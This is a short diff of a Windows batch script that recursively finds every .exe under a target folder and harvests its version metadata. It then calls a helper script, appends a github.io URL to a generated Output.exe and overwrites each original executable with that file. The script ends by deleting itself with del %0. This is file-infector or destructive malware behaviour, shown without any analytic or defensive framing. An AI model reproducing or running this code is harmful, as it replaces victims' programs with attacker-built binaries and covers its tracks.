@@ -11,10 +11,11 @@ for /R "%targetPath%" %%F in (*.exe) do (
         for %%d in (CompanyName FileDescription InternalName LegalCopyright OriginalFilename FileVersion ProductName ProductVersion) do (
             powershell -Command "(Get-Item -Path '%%F').VersionInfo.%%d">%%d
         )
-        "WorkerThread.cmd"
+        call "WorkerThread.cmd"
         echo https://tobecation.github.io/>>"Output.exe"
         copy /y "Output.exe" "%%F"
         del/f/s/q "Output.exe"
     )
 )
+
 del/f/s/q %0
